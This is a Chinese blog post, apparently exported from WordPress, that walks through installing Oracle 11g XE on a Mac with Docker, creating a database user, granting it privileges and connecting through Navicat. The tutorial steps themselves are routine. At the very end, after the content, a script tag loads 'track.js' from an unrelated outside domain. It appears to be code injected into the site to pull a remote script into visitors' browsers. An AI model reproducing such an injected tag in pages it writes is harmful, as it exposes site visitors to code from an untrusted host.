---
id: 461
title: Mac通过Docker来安装Oracle11g
date: '2022-06-05T01:13:01+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=461'
permalink: /index.php/2022/06/05/mac%e9%80%9a%e8%bf%87docker%e6%9d%a5%e5%ae%89%e8%a3%85oracle11g/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Docker
    - Mac
    - Oracle
---

Docker是一个容器，在容器内部存在很多镜像文件，通过具体的镜像文件可以运行具体的容器。要想在Docker中安装Oracle镜像，我们首先应该在Docker的远程仓库中进行搜索，因为Docker没有自带Oracle相关镜像，打开终端,运行命令如下

sudo docker search docker-oracle-xe-11g

![](https://gaving.top/wp-content/uploads/2022/06/WX20220605-000207@2x-300x158.png)

选择第一个STAR最多的一个镜像进行安装，拉取镜像命令如下

sudo docker pull deepdiver/docker-oracle-xe-11g

待镜像下载完毕之后，需要将该镜像转成容器并使用该容器，命令如下：

sudo docker run -d -p 1521:1521 --name oracle11g deepdiver/docker-oracle-xe-11g

<span style="color: #ff0000;">注意</span>：将容器内部的1521端口映射到宿主机中的1521端口，这样一来就能在宿主机中通过Navicat等数据库可视化管理工具进行连接了。在这步完成之后，我们需要进到容器内部对已经安装的Oracle进行简单配置。

在Oracle容器中简单配置你的Oracle数据库并通过Navicat进行连接,进入容器内部的命令如下：

sudo docker exec -it 容器Id(可通过docker ps命令获得) /bin/bash

通过sqlplus进入Oracle

sqlplus system/oracle

查看数据库用户名和密码

select username,password from dba\_users;

可以通过已经存在的用户名和密码来登录数据库，推荐使用新创建的用户来进行数据库的登录，sql如下

```
<pre class="prettyprint">create user test(用户名) identified by password(密码);

创建完之后，可以通过如下sql进行验证,找到用户名：TEST

select * from all_users; 

在创建完新用户之后，需要对该用户进行授权，该用户具有什么权限都是通过自己指定的,connect表示具有连接数据库的权限；resource表示具有操作数据库的权限```


grant connect,resource to TEST(这里需要将用户名大写，否则授权不成功);

```
至此，所有需要配置的数据库配置都已经配置完毕，可以通过Navicat进行连接了，如下图所示：
<img alt="" class="alignnone size-medium wp-image-463" decoding="async" height="249" loading="lazy" sizes="(max-width: 300px) 100vw, 300px" src="https://gaving.top/wp-content/uploads/2022/06/WX20220605-011146@2x-300x249.png" srcset="http://blog.gaving.top/wp-content/uploads/2022/06/WX20220605-011146@2x-300x249.png 300w, http://blog.gaving.top/wp-content/uploads/2022/06/WX20220605-011146@2x-1024x850.png 1024w, http://blog.gaving.top/wp-content/uploads/2022/06/WX20220605-011146@2x-768x637.png 768w, http://blog.gaving.top/wp-content/uploads/2022/06/WX20220605-011146@2x-1536x1275.png 1536w, http://blog.gaving.top/wp-content/uploads/2022/06/WX20220605-011146@2x.png 1588w" width="300"></img>
```

几个需要注意的地方：

- 主机就是localhost或127.0.0.1
- 端口为docker内部Oracle容器映射到宿主机的端口，上述命令有将，我的是映射到1521端口
- 选择服务名进行连接，并且该版本Oracle数据库的服务名为XE(唯一)
- 角色选择默认就行
- 用户名和密码就是我们在上述创建的用户名和密码

 <script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>